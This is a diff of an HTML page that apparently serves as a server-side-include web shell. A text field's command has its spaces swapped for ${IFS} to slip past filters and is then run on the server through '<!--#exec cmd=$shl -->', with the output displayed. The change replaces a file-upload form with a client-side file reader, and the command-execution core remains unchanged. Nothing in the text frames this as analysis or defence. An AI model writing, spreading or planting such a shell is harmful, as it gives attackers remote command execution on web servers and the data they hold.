@@ -22,17 +22,26 @@
             margin: 5px;
         }
     </style>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-    <script language="javascript">
+    <script>
         function fex() {
             var uri = document.getElementById('command').value;
             var rep = uri.replace(/[ ]/g, '${IFS}');
             var res = encodeURI(uri);
             document.location.href = "<!--#echo var=DOCUMENT_NAME -->?" + encodeURI(rep);
         }
-        function uploadFile() {
-            var form = document.getElementById("uploadForm");
-            form.submit();
+
+        function readFileContent() {
+            var fileInput = document.getElementById("fileInput");
+            var file = fileInput.files[0];
+            if (file) {
+                var reader = new FileReader();
+                reader.onload = function(event) {
+                    document.getElementById("output").value = event.target.result;
+                };
+                reader.readAsText(file);
+            } else {
+                alert("Please select a file first!");
+            }
         }
     </script>
 </head>
@@ -52,10 +61,10 @@
             Output: <!--#echo var=shl -->
         </font><br><br>
         <textarea bgcolor="#e4e0d8" cols=120 rows=15><!--#exec cmd=$shl --></textarea><br><br>
-        <form id="uploadForm" method="POST" enctype="multipart/form-data" action="upload.cgi">
-            <input type="file" name="file" required>
-            <input type="button" style="color:white;background-color:#808080;" value="Upload" onclick="uploadFile();">
-        </form>
+        <input type="file" id="fileInput">
+        <input type="button" style="color:white;background-color:#808080;" value="Read File" onclick="readFileContent();">
+        <br><br>
+        <textarea id="output" cols=120 rows=15 placeholder="File content will appear here..."></textarea>
     </center>
 </body>
 </html>
